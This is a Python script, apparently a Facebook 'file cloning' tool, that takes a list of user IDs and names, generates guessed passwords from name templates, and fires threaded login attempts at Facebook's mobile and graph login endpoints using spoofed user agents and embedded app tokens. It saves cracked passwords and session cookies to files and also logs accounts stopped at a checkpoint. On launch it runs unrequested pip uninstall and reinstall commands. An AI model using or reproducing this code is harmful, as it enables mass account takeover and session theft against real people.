# SOURCE BY: DHANU
# GIFT BY: THARINDU N. DHANUSHKA

import os
import base64
import zlib
import platform
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as bsp
print('\n  \x1b[38;5;86mINSTALLING MISSING MODULES ...!')
os.system("pip uninstall urllib3 requests chardet idna certifi -y")
os.system("pip install urllib3 requests chardet idna certifi")
os.system('xdg-open ~')
try:
    from bs4 import BeautifulSoup as bsp
except ImportError:
    os.system('pip install bs4')
    from bs4 import BeautifulSoup as bsp
try:
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import string
    import subprocess
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    print('\n  \x1b[38;5;86mInstalling missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python DHANU.py')
    os.system('xdg-open ~')
#__________NEW IDX UA_____________#

def DHANU():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]""Mozilla/5.0 (Linux; Android 10; CND-AN00 Build/HUAWEICND-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.19 SP-engine/2.15.0 baiduboxapp/11.19.0.11 (Baidu; P1 10)]""Mozilla/5.0 (Linux; Android 10; CND-AN00 Build/HUAWEICND-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.19 SP-engine/2.15.0 baiduboxapp/11.19.0.11 (Baidu; P1 10)]""Mozilla/5.0 (Linux; Android 10; CND-AN00 Build/HUAWEICND-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.156 Mobile Safari/537.36 JsSdk/2 NewsArticle/8.3.0 NetType/4g (NewsLite 8.3.0) TTWebView/0751130021008]""Mozilla/5.0 (Linux; Android 10; HarmonyOS; CDY-TN00; HMSCore 6.15.0.302; GMSCore 24.08.12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 HuaweiBrowser/16.0.1.301 Mobile Safari/537.36]""Mozilla/5.0 (Linux; Android 10; CDY-AN20 Build/HUAWEICDY-AN20; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 Mb2345Browser/16.1.7]""Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v7511588644364269282 t8052286838287810618]""Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v3384150621194388693 t4951733999716571247]""Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v8165848623374533218 t4157550440124640339]""[FB_IAB/FB4A;FBAV/298.0.0.46.116;]"
	ua = s + e	
	return ua



#__________BD UA_____________#

ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt) 
    

def clear():
	os.system('clear')
	print(logo)
logo=("""

   \x1b[38;5;19m██████\x1b[38;5;246m╗ \x1b[38;5;19m██\x1b[38;5;246m╗  \x1b[38;5;19m██\x1b[38;5;246m╗ \x1b[38;5;19m█████\x1b[38;5;246m╗ \x1b[38;5;19m███\x1b[38;5;246m╗   \x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m██\x1b[38;5;246m╗   \x1b[38;5;19m██\x1b[38;5;246m╗
   \x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m████\x1b[38;5;246m╗  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║   \x1b[38;5;19m██\x1b[38;5;246m║
   \x1b[38;5;227m██\x1b[38;5;246m║  \x1b[38;5;227m██\x1b[38;5;246m║\x1b[38;5;227m███████\x1b[38;5;246m║\x1b[38;5;227m███████\x1b[38;5;246m║\x1b[38;5;227m██\x1b[38;5;246m╔\x1b[38;5;227m██\x1b[38;5;246m╗ \x1b[38;5;227m██\x1b[38;5;246m║\x1b[38;5;227m██\x1b[38;5;246m║   \x1b[38;5;227m██\x1b[38;5;246m║
   \x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m╔══\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;246m╚\x1b[38;5;19m██\x1b[38;5;246m╗\x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║   \x1b[38;5;20m██\x1b[38;5;246m║
   \x1b[38;5;19m██████\x1b[38;5;246m╔╝\x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║  \x1b[38;5;19m██\x1b[38;5;246m║\x1b[38;5;19m██\x1b[38;5;246m║ \x1b[38;5;246m╚\x1b[38;5;19m████\x1b[38;5;246m║\x1b[38;5;246m╚\x1b[38;5;19m██████\x1b[38;5;246m╔╝
   \x1b[38;5;246m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝
                                                            \x1b[38;5;141m◦◉◎\x1b[38;5;190mWELCOME  MY TOOL \x1b[38;5;141m◎◉◦
   \x1b[38;5;13m╔═════════════════════════════════════════╗
   \x1b[38;5;13m║  \x1b[38;5;160mOWNER      \x1b[38;5;91m➜    \x1b[38;5;121mTHARINDU N. DHANUSHKA  \x1b[38;5;13m║
   \x1b[38;5;13m║  \x1b[38;5;160mFACEBOOK   \x1b[38;5;91m➜    \x1b[38;5;121mDHANU BABAA            \x1b[38;5;13m║
   \x1b[38;5;13m║  \x1b[38;5;160mSTATUS     \x1b[38;5;91m➜    \x1b[38;5;121mFILE CLONE             \x1b[38;5;13m║
   \x1b[38;5;13m║  \x1b[38;5;160mTOOL TYPE  \x1b[38;5;91m➜    \x1b[38;5;121mFREE                   \x1b[38;5;13m║
   \x1b[38;5;13m║  \x1b[38;5;160mVERSION    \x1b[38;5;91m➜    \x1b[38;5;121m00.00                  \x1b[38;5;13m║
   \x1b[38;5;13m╚═════════════════════════════════════════╝""")
def line():
	print(f'\x1b[38;5;105m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

loop=0
oks=[]
cps=[]
pcp=[]
ck=[]
#_________Year checker_________#
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 /'
        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 /'
        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 /'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 /'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 /'
        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 /'
        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 /'
        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 /'
        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 /'
        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 /'
        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 /'
        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 /'
        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 /'
        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 /'
        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 /'
        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 /'
        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 /'
        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 /'
        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 /'
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' ACCOUNT 2008/2009 /'
    elif len(uid)==8:
        alif = ' ACCOUNT 2007/2008 /'
    elif len(uid)==7:
        alif = ' ACCOUNT 2006/2007 /'
    else:alif=''
    return alif 

#_________Cloning Menu_________#
def menu():
    try:
                clear()        
                x = ("***")
                if x == ("***"):
                        print('  \x1b[38;5;90m(\x1b[38;5;82m1\x1b[38;5;90m).  \x1b[38;5;191mFILE CLONING')
                        print('  \x1b[38;5;90m(\x1b[38;5;82m2\x1b[38;5;90m).  \x1b[38;5;191mEXIT ')
                        line()
                        xd=input(' \x1b[38;5;123mCHOOSE AN OPTION: ')
                        if xd in ['1','01']:
                                clear()
                                
                                print('   \x1b[38;5;90mPUT FILE EXAMPLE :  \x1b[38;5;118m/sdcard/file.txt.etc..')
                                line()
                                file = input(' \x1b[38;5;155mPUT FILE PATH : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' \x1b[38;5;09mFILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('   \x1b[38;5;90m(\x1b[38;5;82m1\x1b[38;5;90m). \x1b[38;5;195mMETHOD-01    \x1b[38;5;196m(\x1b[38;5;227mNOT WORK\x1b[38;5;196m) ')
                                print('   \x1b[38;5;90m(\x1b[38;5;82m2\x1b[38;5;90m). \x1b[38;5;195mMETHOD-02   ')
                                
                                
                                line()
                                mthd=input(' \x1b[38;5;157mCHOOSE : ')
                                line()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(' \x1b[38;5;156mHOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                except:
                                        ps_limit =1
                                line()
                                clear()
                                print('   \033[1;32m EXAMPLE : \x1b[38;5;143mfirst2000,last2000,firts2001')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f' \x1b[38;5;219mPUT PASSWORD \x1b[38;5;193m{i+1}: '))
                                line()
                                clear()
                                print('   \x1b[38;5;229mDO YOU WENT SHOW COOKIES :?  \x1b[38;5;160m(\x1b[38;5;87mY\x1b[38;5;160m/\x1b[38;5;87mN\x1b[38;5;160m): ')
                                line()
                                cx=input(' \x1b[38;5;195mCHOOSE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                       pcp.append('\x1b[38;5;219my')
                                else:
                                        pcp.append('\x1b[38;5;219mn')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print('   \x1b[38;5;112mTOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
                                        print('   \x1b[38;5;171mUSE FLIGHT MODE \x1b[38;5;160m(\x1b[38;5;190mON\x1b[38;5;160m/\x1b[38;5;190mOFF\x1b[38;5;160m) \x1b[38;5;192m3m \x1b[38;5;171mDURING CLONING')
                                        line()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(newidx,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['4','04']:
                                                       crack_submit.submit(newidx,ids,names,passlist)        
                                print('\033[1;37m')
                                line()
                                print(' THE PROCESS HAS COMPLETED')
                                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                line()
                                input(' PRESS ENTER TO BACK ')
                                os.system('python DHANU.py')
                        elif xd in ['2','02']:
                                clear()
                                print(' \033[1;37m[\033[1;32m1\033[1;37m]\033[1;37m PAKISTAN CLONING\n \033[1;37m[\033[1;32m2\033[1;37m]\033[1;37m BANGLADESH CLONING\n \033[1;37m[\033[1;32m3\033[1;37m]\033[1;37m AFGHANISTAN CLONING\n \033[1;37m[\033[1;32m4\033[1;37m]\033[1;37m INDIA CLONING\n \033[1;37m[\033[1;32m5\033[1;37m]\033[1;37m GMAIL CLONING\n \033[1;37m[\033[1;32m0\033[1;37m]\033[1;37m BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        afg()
                                elif x in ['4','04']:
                                        ind()        
                                elif x in ['5','05']:  
                                        gmail()      
                                else:
                                        menu()                                   
                        elif xd in ['0','00']:
                                exit()
                        
    except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDHANU\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        #ua = random.choice()
                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':DHANU, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start];q=0.8,application/signed-exchange;v=b3;q=0.7','sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\033[96;1 [DHANU-OK] %s | %s'%(ids,pas))
                                open('/sdcard/DHANU-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/DHANU-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [DHANU-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DHANU-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDHANU\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			head = {'User-Agent':DHANU(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [DHANU-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;93m [ðŸ©] Cookies :- '+cookies)
				line()
				open('/sdcard/DHANU-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;91m [DHANU-CP] '+uid+' | '+pas+'\033[1;91m')
				open('/sdcard/DHANU-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mDHANU\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			head = {"User-Agent": DHANU(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [DHANU-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;93m [ðŸ©] Cookies :- '+cookies)
				line()
				open('/sdcard/DHANU-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;91m [DHANU-CP] '+uid+' | '+pas+'\033[1;91m')
				open('/sdcard/DHANU-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
menu()
